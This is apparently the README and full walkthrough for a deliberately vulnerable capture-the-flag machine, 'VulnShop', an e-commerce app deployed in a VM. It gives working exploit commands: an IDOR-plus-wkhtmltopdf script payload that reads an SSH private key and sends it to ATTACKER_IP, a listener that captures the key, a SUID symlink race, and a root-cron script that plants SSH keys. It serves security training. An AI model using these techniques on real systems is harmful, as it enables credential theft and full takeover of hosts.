# VulnShop — HTB Machine

**OS:** Linux (Debian 13 Trixie)  
**Difficulty:** Hard  
**Domain:** `vulnshop.htb`  
**Services:** HTTP (80), DNS (53), SSH (22)

---

## Overview

VulnShop is a multi-tenant SaaS e-commerce platform built on FastAPI + Next.js + PostgreSQL.
The attack chain covers three distinct vulnerability classes: IDOR leading to SSRF, a classic TOCTOU race on a SUID binary, and a misconfigured group-writable directory executed by root cron.

```
[attacker] --IDOR+SSRF--> [jonny] --TOCTOU SUID--> [sarah] --netdata cron--> [root]
```

---

## Enumeration

Add the target to `/etc/hosts`:

```
echo "10.10.11.X vulnshop.htb" >> /etc/hosts
```

### Port scan

```
nmap -sV -sC -p- vulnshop.htb
```

Open ports:
- `22/tcp` — OpenSSH
- `53/tcp/udp` — DNS (dnsmasq)
- `80/tcp` — HTTP (nginx → Next.js)

### DNS enumeration

```
dig @vulnshop.htb vulnshop.htb ANY
dig @vulnshop.htb vulnshop.htb MX
```

### Web enumeration

```
curl -I http://vulnshop.htb
```

Response header:

```
X-PDF-Generator: wkhtmltopdf/0.12.6
```

`robots.txt`:

```
Disallow: /static/reports/
```

**Key hints:**
- `X-PDF-Generator` → server generates PDFs with wkhtmltopdf 0.12.6 (supports JS + `file://`)
- `/static/reports/` → PDF reports are accessible at a predictable path

---

## Foothold — IDOR → SSRF → jonny

### Step 1 — Register and authenticate

```bash
curl -s -c cookies.txt -X POST http://vulnshop.htb/api/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com","password":"password123"}'

curl -s -c cookies.txt -X POST http://vulnshop.htb/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com","password":"password123"}'
```

### Step 2 — IDOR: read another user's order

The `/api/orders/{id}` endpoint lacks ownership checks. Any authenticated user can read any order by ID.

```bash
curl -s -b cookies.txt http://vulnshop.htb/api/orders/1 | python3 -m json.tool
```

Response reveals order belonging to `jonny@vulnshop.com` with `"status": "disputed"`.
Only **disputed** orders belonging to **admin users** are included in the automated PDF report.

### Step 3 — IDOR: inject SSRF payload into the order note

```bash
curl -s -b cookies.txt -X PUT http://vulnshop.htb/api/orders/1 \
  -H 'Content-Type: application/json' \
  -d '{
    "status": "disputed",
    "note": "<script>var x=new XMLHttpRequest();x.open(\"GET\",\"file:///home/jonny/.ssh/id_rsa\",false);x.send();var y=new XMLHttpRequest();y.open(\"GET\",\"http://ATTACKER_IP:9999/?k=\"+btoa(x.responseText),false);y.send();</script>"
  }'
```

The `note` field is rendered as raw HTML inside the PDF (Jinja2 `autoescape=False`).

### Step 4 — Catch the callback

Start an HTTP listener on port 9999:

```bash
python3 -c "
import http.server, urllib.parse, base64, sys

class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        if 'k' in params:
            key = base64.b64decode(params['k'][0]).decode()
            open('jonny_id_rsa', 'w').write(key)
            print('[+] Key saved to jonny_id_rsa')
        self.send_response(200); self.end_headers(); self.wfile.write(b'ok')

http.server.HTTPServer(('0.0.0.0', 9999), H).serve_forever()
"
```

Within ~60 seconds the backend cron fires, wkhtmltopdf renders the HTML with JavaScript enabled, reads `file:///home/jonny/.ssh/id_rsa` from the container filesystem, and exfiltrates it to the listener.

### Step 5 — SSH as jonny

```bash
chmod 600 jonny_id_rsa
ssh -i jonny_id_rsa jonny@vulnshop.htb
```

```
uid=1001(jonny) gid=1001(jonny) groups=1001(jonny)
```

---

## Privesc 1 — jonny → sarah (TOCTOU race on SUID binary)

### Reconnaissance

```bash
find / -perm -4000 2>/dev/null
```

```
-rwsr-xr-x 1 sarah sarah 16680 ... /usr/local/bin/log-report
```

The binary is SUID and owned by sarah. Running it:

```bash
/usr/local/bin/log-report
```

```
[log-report] archiving report entry -- Thu May 29 ...
[log-report] done. archived to /tmp/.report_out
```

### Source analysis

The binary logic:

```c
// 1. lstat() — checks if /tmp/.report_out is a symlink → exits if yes
// 2. unlink() — removes it if it's a regular file
// 3. fopen(INPUT_PATH, "r")  — reads /tmp/.report_in
// 4. printf("archiving...")
// 5. sleep(2)                 ← RACE WINDOW
// 6. fopen(OUTPUT_PATH, "w") — opens /tmp/.report_out as effective UID=sarah
// 7. copy input → output
```

The check happens **before** the sleep. There is a 2-second window between the lstat check and the write. If a symlink is planted during that window, the binary (running as sarah) will follow it and write to the target.

### Exploit

Generate an SSH key pair:

```bash
ssh-keygen -t ed25519 -f /tmp/attacker_key -N ""
```

Run the race:

```bash
echo "$(cat /tmp/attacker_key.pub)" > /tmp/.report_in
rm -f /tmp/.report_out
/usr/local/bin/log-report &
sleep 0.4
ln -sf /home/sarah/.ssh/authorized_keys /tmp/.report_out
wait
```

SSH as sarah:

```bash
ssh -i /tmp/attacker_key sarah@vulnshop.htb
cat ~/user.txt
```

---

## Privesc 2 — sarah → root (Netdata custom-checks)

### Reconnaissance

```bash
id
```

```
uid=1002(sarah) gid=1002(sarah) groups=1002(sarah),988(netdata)
```

Sarah is a member of the `netdata` group. Enumerate the Netdata installation:

```bash
find /opt/netdata -ls 2>/dev/null
curl -s http://127.0.0.1:19999/
```

The dashboard at `127.0.0.1:19999` reveals Netdata version and hostname. The custom-checks directory:

```
drwxrwsr-x  root  netdata  /opt/netdata/custom-checks/
```

Permissions are `2775` (SGID + group write) — sarah can write files here.

Check the cron:

```bash
cat /etc/cron.d/netdata-custom
```

```
*/1 * * * * root find /opt/netdata/custom-checks -maxdepth 1 -name "*.sh" -executable -exec bash {} \;
```

Root executes every `.sh` file in this directory every minute.

### Exploit

```bash
cat > /opt/netdata/custom-checks/pwn.sh << 'EOF'
#!/bin/bash
mkdir -p /root/.ssh
echo 'ATTACKER_PUBKEY' >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
EOF

chmod +x /opt/netdata/custom-checks/pwn.sh
```

Wait up to 60 seconds, then:

```bash
ssh -i /tmp/attacker_key root@vulnshop.htb
cat /root/root.txt
```

---

## Vulnerability Summary

| # | Vulnerability | Location | Impact |
|---|--------------|----------|--------|
| 1 | IDOR — no ownership check on GET/PUT `/orders/{id}` | FastAPI backend | Read/write any order |
| 2 | Stored XSS / HTML injection via `note` field (Jinja2 `autoescape=False`) | PDF report template | Execute JS in wkhtmltopdf |
| 3 | SSRF via wkhtmltopdf 0.12.6 `file://` + XHR | PDF generation cron | Read arbitrary container files |
| 4 | TOCTOU race on SUID binary `/usr/local/bin/log-report` | Host system | Escalate to sarah |
| 5 | Group-writable cron directory executed as root | `/opt/netdata/custom-checks/` | Escalate to root |

---

## Project Structure

```
.
├── backend/                  FastAPI application
│   ├── app/
│   │   ├── main.py           Routes, auth, IDOR endpoints
│   │   └── templates/        Jinja2 PDF template (autoescape=False)
│   ├── scripts/
│   │   └── generate_report.py  wkhtmltopdf cron job
│   ├── secrets/
│   │   └── jonny_id_rsa      SSH private key baked into container (SSRF target)
│   ├── crontab               Cron schedule for report generation
│   └── Dockerfile
├── frontend/                 Next.js App Router
├── docker-compose.yml
└── vm-setup/
    ├── setup.sh              VM provisioning (users, SUID binary, Netdata, firewall)
    ├── provision.sh          Deploy script (run from Kali)
    └── docker-compose.prod.yml  Production port overrides
```

---

## Deployment

### Requirements
- VirtualBox with Debian 13 Trixie VM (bridged adapter)
- VM IP: configure in `vm-setup/provision.sh`
- SSH key at `~/.ssh/omni_provision` (see `vm-setup/omni_provision.pub`)

### Steps

```bash
# 1. Install Debian 13 on VM (bridged network, hostname: vulnshop)
# 2. Ensure omni user has NOPASSWD sudo
# 3. Run provisioning from Kali:
bash vm-setup/provision.sh
```

`provision.sh` will:
1. Run `setup.sh` on the VM (users, SUID binary, Netdata, DNS, firewall)
2. Copy project files to `/opt/omni-store/`
3. Apply production docker-compose overrides
4. Start the application stack

---

## Flags

| Flag | Path | Readable by |
|------|------|-------------|
| user.txt | `/home/sarah/user.txt` | sarah, root |
| root.txt | `/root/root.txt` | root |
